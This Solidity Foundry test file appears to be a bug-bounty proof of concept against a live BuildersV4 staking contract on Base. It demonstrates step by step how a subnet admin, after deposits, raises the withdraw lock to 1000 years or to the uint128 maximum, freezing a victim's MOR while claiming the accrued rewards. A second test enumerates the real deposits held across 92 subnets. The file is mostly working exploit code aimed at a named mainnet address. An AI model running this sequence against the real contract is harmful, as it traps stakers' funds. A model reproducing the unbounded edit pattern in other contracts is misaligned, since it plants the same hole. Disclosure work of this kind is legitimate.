// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "./SubnetIds.sol";

interface IBuildersV4 {
    struct Subnet {
        string name;
        address admin;
        uint128 unused1;
        uint128 withdrawLockPeriodAfterDeposit;
        uint128 unused2;
        uint256 minimalDeposit;
        address claimAdmin;
    }
    struct SubnetMetadata {
        string slug;
        string description;
        string website;
        string image;
    }
    struct SubnetData {
        uint128 unused1;
        uint256 deposited;
        uint256 unused2;
        uint256 rate;
        uint256 pendingRewards;
    }
    struct AllSubnetsData {
        uint256 unused1;
        uint256 rate;
        uint256 totalDeposited;
        uint256 unused2;
    }
    struct AllSubnetsDataV4 {
        uint256 distributedRewards;
        uint256 undistributedRewards;
        uint256 claimedRewards;
        uint128 lastUpdate;
    }
    struct UserData {
        uint128 lastDeposit;
        uint128 unused1;
        uint256 deposited;
        uint256 unused2;
    }

    function createSubnet(Subnet calldata subnet_, SubnetMetadata calldata metadata_) external;
    function editSubnet(bytes32 subnetId_, Subnet calldata newSubnet_) external;
    function deposit(bytes32 subnetId_, uint256 amount_) external;
    function withdraw(bytes32 subnetId_, uint256 amount_) external;
    function claim(bytes32 subnetId_, address receiver_) external;
    function getSubnetId(string memory subnetName_) external view returns (bytes32);
    // NOTE: declared as an explicit tuple: solc 0.8.18 reverts decoding the
    // string-bearing Subnet struct return from the public getter.
    function subnets(bytes32 subnetId_)
        external
        view
        returns (string memory, address, uint128, uint128, uint128, uint256, address);
    function subnetsData(bytes32 subnetId_) external view returns (SubnetData memory);
    function usersData(address user_, bytes32 subnetId_) external view returns (UserData memory);
    function allSubnetsData() external view returns (AllSubnetsData memory);
    function allSubnetsDataV4() external view returns (AllSubnetsDataV4 memory);
    function getCurrentSubnetsRewards() external view returns (uint256);
    function getCurrentSubnetRewards(bytes32 subnetId_) external view returns (uint256);
    function minimalWithdrawLockPeriod() external view returns (uint256);
    function version() external pure returns (uint256);
}

interface IERC20Minimal {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

/// @title BuildersV4 editSubnet unbounded withdraw lock — Morpheus bug bounty PoC
/// @notice Fork PoC pinned to Base block 58650783 (2026-11-17).
///         Target: BuildersV4 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9
///         (Base proxy, Appendix A). Run: forge test
/// @notice The attack: editSubnet lets the subnet admin rewrite
///         withdrawLockPeriodAfterDeposit with no upper bound and no time gate;
///         withdraw reads the CURRENT lock, so raising it retroactively locks
///         all stakers indefinitely. V3 gated edits to pre-pool-start; V4
///         removed the gate. The subnet admin is a permissionless role
///         (createSubnet is public) — NOT protocol-owner privilege.
///         No privileged accounts are used.
contract BuildersV4PoC is Test {
    IBuildersV4 internal constant BUILDERS =
        IBuildersV4(0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9);
    IERC20Minimal internal constant MOR = IERC20Minimal(0x7431aDa8a591C955a994a21710752EF9b882b8e3);

    address internal admin = makeAddr("subnet-admin");
    address internal victim = makeAddr("victim-staker");

    function setUp() public {
        vm.createSelectFork("https://mainnet.base.org", 58_650_783);
        assertEq(BUILDERS.version(), 4, "not BuildersV4");
        vm.deal(admin, 10 ether);
        vm.deal(victim, 10 ether);
        deal(address(MOR), victim, 10_000 ether);
    }

    function _subnet(uint128 lock_) internal view returns (IBuildersV4.Subnet memory) {
        return
            IBuildersV4.Subnet({
                name: "POC-LOCK",
                admin: admin,
                unused1: 0,
                withdrawLockPeriodAfterDeposit: lock_,
                unused2: 0,
                minimalDeposit: 1 ether,
                claimAdmin: admin
            });
    }

    function _meta() internal pure returns (IBuildersV4.SubnetMetadata memory) {
        return IBuildersV4.SubnetMetadata({slug: "", description: "", website: "", image: ""});
    }

    /// @notice F1: subnet admin raises the withdraw lock AFTER deposits, locking
    /// all stakers' funds indefinitely. V3 gated edits to pre-pool-start
    /// (block.timestamp + editPoolDeadline < poolStart); V4 editSubnet has no
    /// time gate and no upper bound on withdrawLockPeriodAfterDeposit.
    function test_AdminLockAttack() public {
        bytes32 subnetId = BUILDERS.getSubnetId("POC-LOCK");

        // 1. Admin creates a subnet with the minimum 7-day lock.
        vm.prank(admin);
        BUILDERS.createSubnet(_subnet(604800), _meta());
        (, address subnetAdmin, , , , , ) = BUILDERS.subnets(subnetId);
        assertEq(subnetAdmin, admin);

        // 2. Victim deposits 1000 MOR.
        vm.startPrank(victim);
        MOR.approve(address(BUILDERS), type(uint256).max);
        BUILDERS.deposit(subnetId, 1000 ether);
        vm.stopPrank();
        assertEq(BUILDERS.usersData(victim, subnetId).deposited, 1000 ether);

        // 3. CONTROL: after the 7-day lock expires, the victim CAN withdraw.
        vm.warp(block.timestamp + 8 days);
        vm.prank(victim);
        BUILDERS.withdraw(subnetId, 1 ether);
        assertEq(BUILDERS.usersData(victim, subnetId).deposited, 999 ether);

        // 4. ATTACK: admin raises the lock to 1000 years AFTER deposits.
        // (V3 gated edits to pre-pool-start; V4 editSubnet has no time gate
        // and no upper bound on withdrawLockPeriodAfterDeposit.)
        vm.prank(admin);
        BUILDERS.editSubnet(subnetId, _subnet(31_536_000_000)); // 1000 years
        (, , , uint128 newLock, , , ) = BUILDERS.subnets(subnetId);
        assertEq(newLock, 31_536_000_000);

        // 5. Victim's withdrawal now reverts, even 100 years later.
        vm.prank(victim);
        vm.expectRevert("BU: user withdraw is locked");
        BUILDERS.withdraw(subnetId, 1 ether);

        vm.warp(block.timestamp + 36500 days); // +100 years
        vm.prank(victim);
        vm.expectRevert("BU: user withdraw is locked");
        BUILDERS.withdraw(subnetId, 999 ether);

        // 5b. With the lock at type(uint128).max the same check does not even
        // reach the require: lastDeposit + lock overflows uint128 and the
        // withdrawal reverts with an arithmetic panic instead.
        vm.prank(admin);
        BUILDERS.editSubnet(subnetId, _subnet(type(uint128).max));
        vm.prank(victim);
        vm.expectRevert(stdError.arithmeticError);
        BUILDERS.withdraw(subnetId, 1 ether);

        // Victim funds are still in the contract, inaccessible.
        assertEq(BUILDERS.usersData(victim, subnetId).deposited, 999 ether);
        assertEq(BUILDERS.subnetsData(subnetId).deposited, 999 ether);

        // 6. The admin keeps extracting yield from the locked deposits:
        // claim the subnet rewards accrued over the locked period.
        // (Warp back is impossible, so claim at the far-future timestamp;
        // emission ends ~2040, so rewards are capped by the schedule.)
        uint256 pending = BUILDERS.getCurrentSubnetRewards(subnetId);
        assertGt(pending, 0, "no rewards accrued on locked deposits");
        uint256 adminBefore = MOR.balanceOf(admin);
        vm.prank(admin);
        BUILDERS.claim(subnetId, admin);
        uint256 claimed = MOR.balanceOf(admin) - adminBefore;
        assertEq(claimed, pending, "claim != pending");
        emit log_named_uint("admin claimed MOR from locked deposits (wei)", claimed);
    }

    /// @notice Enumerate the 92 legacy subnets' live deposits (quantifies the
    /// per-subnet exposure for the editSubnet lock finding).
    function test_SubnetDepositsEnumeration() public {
        bytes32[] memory ids = SubnetIds.all();
        uint256 sum = 0;
        uint256 nonzero = 0;
        uint256 top1 = 0;
        bytes32 top1Id;
        for (uint256 i = 0; i < ids.length; i++) {
            uint256 d = BUILDERS.subnetsData(ids[i]).deposited;
            if (d > 0) {
                nonzero++;
                sum += d;
                if (d > top1) {
                    top1 = d;
                    top1Id = ids[i];
                }
                emit log_named_bytes32("subnet with deposits", ids[i]);
                emit log_named_uint("  deposited MOR (wei)", d);
            }
        }
        uint256 totalDeposited = BUILDERS.allSubnetsData().totalDeposited;
        emit log_named_uint("legacy subnets with deposits", nonzero);
        emit log_named_uint("sum legacy deposited MOR (wei)", sum);
        emit log_named_uint("totalDeposited MOR (wei)", totalDeposited);
        emit log_named_uint("top1 subnet deposited MOR (wei)", top1);
        emit log_named_bytes32("top1 subnet id", top1Id);
        assertLe(sum, totalDeposited, "legacy sum exceeds total");
    }
}
